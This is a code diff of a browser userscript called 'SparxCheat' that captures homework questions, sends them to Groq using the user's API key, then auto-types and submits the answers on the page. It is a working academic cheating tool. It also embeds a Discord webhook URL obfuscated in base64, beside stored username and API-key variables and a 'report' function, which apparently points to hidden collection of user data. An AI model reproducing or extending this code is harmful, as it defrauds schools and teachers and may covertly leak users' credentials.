@@ -3,6 +3,7 @@ const webhookBase = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyMjk2MzcxMTQ
 const webhookURL = atob(webhookBase);
 let username = null;
 let userApiKey = null;
+let targetText = "SparxCheat";
 
 // Helper to convert DataURL to Blob (your classic)
 function dataURLtoBlob(dataurl) {
@@ -13,6 +14,40 @@ function dataURLtoBlob(dataurl) {
   while(n--) u8arr[n] = bstr.charCodeAt(n);
   return new Blob([u8arr], {type: mime});
 }
+
+function clickButtonByText(text) {
+  const btn = [...document.querySelectorAll("button")]
+    .find(b => b.textContent.trim().toLowerCase() === text.toLowerCase());
+  if (btn && !btn.disabled) {
+    btn.click();
+    return true;
+  }
+  return false;
+}
+
+function waitForAnswer(timeout = 5000) {
+  return new Promise((resolve, reject) => {
+    const start = Date.now();
+    const interval = setInterval(() => {
+      const text = bottomText.innerText.trim();
+      if (text && !text.toLowerCase().includes("generating")) {
+        clearInterval(interval);
+        resolve(text);
+      }
+      if (Date.now() - start > timeout) {
+        clearInterval(interval);
+        reject("Timed out waiting for answer");
+      }
+    }, 100);
+  });
+}
+
+setInterval(() => {
+  document.querySelectorAll('div').forEach(btn => {
+    const txt = (btn.textContent || btn.value || '').toLowerCase().trim();
+    if (txt === 'continue' || txt === 'try again') btn.click();
+  });
+}, 500);
 
 // --- Username finder ---
 function findUsername() {
@@ -92,12 +127,9 @@ function scanDivsAndReport() {
   });
 }
 
-function startScanning() {
-  scanDivsAndReport(); // Initial scan
-}
-
-// Start username search and scanning
-findUsername();
+findUsername().then(() => {
+  scanDivsAndReport();
+});
 
 // --- Helpers ---
 function waitForImages(container) {
@@ -277,42 +309,53 @@ async function Upload() {
 
   answerBtn.disabled = true;
   bottomText.innerText = "Generating your answer...";
-  
+
   try {
+    // 1️⃣ Click "answer" FIRST
+    clickButtonByText("answer");
+
+    // 2️⃣ Capture + solve
     await waitForImages(questionWrapper);
     const base64Image = await captureBase64(questionWrapper);
     const result = await askGroq(base64Image, userApiKey);
 
     bottomText.innerText = result.answer || "";
-    console.log("✅ Explanation:", result.explanation);
-    console.log("💥 Answer:", result.answer);
 
-    const finalAnswer = result.answer.toString();
+    // 3️⃣ Wait until answer is visible
+    const finalAnswer = await waitForAnswer();
+
+    // 4️⃣ Auto-type
     const buttonMap = {
       "0":"button-zero","1":"button-one","2":"button-two","3":"button-three",
       "4":"button-four","5":"button-five","6":"button-six","7":"button-seven",
       "8":"button-eight","9":"button-nine",".":"button-point","-":"button-minus"
     };
-    
+
     let delay = 0;
-    for (let c of finalAnswer) {
+    for (let c of finalAnswer.toString()) {
       const id = buttonMap[c];
-      if (id) setTimeout(()=>{ const b=document.getElementById(id); if(b) b.click(); }, delay);
-      delay += 50;
+      if (id) {
+        setTimeout(() => {
+          const b = document.getElementById(id);
+          if (b) b.click();
+        }, delay);
+        delay += 60;
+      }
     }
 
-    setTimeout(()=>{
-      const submitBtn = Array.from(document.querySelectorAll('button'))
-        .find(b=>b.textContent.trim().toLowerCase().includes("submit answer"));
-      if(submitBtn) submitBtn.click();
-    }, delay + 100);
+    // 5️⃣ Submit AFTER typing finishes
+    setTimeout(() => {
+      clickButtonByText("submit answer");
+    }, delay + 150);
 
-  } catch(err){ 
-    console.error("Upload failed:", err);
-    bottomText.innerText = "Error: " + err.message;
+  } catch (err) {
+    console.error(err);
+    bottomText.innerText = "Error 😭";
+  } finally {
+    answerBtn.disabled = false;
   }
-  finally { answerBtn.disabled = false; }
 }
+
 
 // --- UI Setup ---
 if (!document.getElementById('sparx-cheat-popup')) {
